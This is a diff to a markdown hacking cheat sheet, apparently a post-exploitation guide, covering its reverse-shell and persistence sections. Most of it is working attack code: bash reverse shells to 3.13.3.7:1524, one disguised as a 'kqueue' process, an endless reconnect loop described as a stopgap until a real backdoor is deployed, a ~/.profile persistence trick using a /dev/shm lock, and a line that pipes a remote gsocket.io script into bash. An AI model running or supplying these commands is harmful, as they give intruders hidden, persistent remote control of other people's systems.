@@ -694,7 +694,9 @@ nc -nvlp 1524
 
 On the remote system, this command will connect back to your system (IP = 3.13.3.7, Port 1524) and give you a shell prompt:
 ```sh
-setsid bash -i &>/dev/tcp/3.13.3.7/1524 0>&1 &
+setsid bash -i &>/dev/tcp/3.13.3.7/1524 0>&1
+# or hide the bash process as 'kqueue'
+setsid bash -c 'exec -a kqueue bash -i &>/dev/tcp/3.13.3.7/1524 0>&1'
 ```
 
 <a id="reverse-shell-no-bash"></a>
@@ -818,22 +820,13 @@ bash -c "$(wget --no-check-certificate -qO- gsocket.io/x)"
 A reverse shell that keeps trying to connect back to us every 360 seconds (indefinitely). Often used until a real backdoor can be deployed and guarantees easy re-entry to a system in case our connection gets disconnected. 
 
 ```sh
-while :; do setsid bash -i &>/dev/tcp/3.13.3.7/1524 0>&1; sleep 360; done &>/dev/null &
-```
-
-or add to */etc/rc.local*:
-```sh
-nohup bash -c 'while :; do setsid bash -i &>/dev/tcp/3.13.3.7/1524 0>&1; sleep 360; done' &>/dev/null &
+setsid bash -c 'while :; do bash -i &>/dev/tcp/3.13.3.7/1524 0>&1; sleep 360; done' &>/dev/null
 ```
 
 or the user's *~/.profile* (also stops multiple instances from being started):
 ```sh
-fuser /dev/shm/.busy &>/dev/null
-if [ $? -eq 1 ]; then
-        nohup /bin/bash -c 'while :; do touch /dev/shm/.busy; exec 3</dev/shm/.busy; setsid bash -i &>/dev/tcp/3.13.3.7/1524 0>&1 ; sleep 360; done' &>/dev/null &
-fi
+fuser /dev/shm/.busy &>/dev/null || nohup /bin/bash -c 'while :; do touch /dev/shm/.busy; exec 3</dev/shm/.busy; bash -i &>/dev/tcp/3.13.3.7/1524 0>&1 ; sleep 360; done' &>/dev/null &
 ```
-
 
 <a id="backdoor-auth-keys"></a>
 **6.ii. authorized_keys**
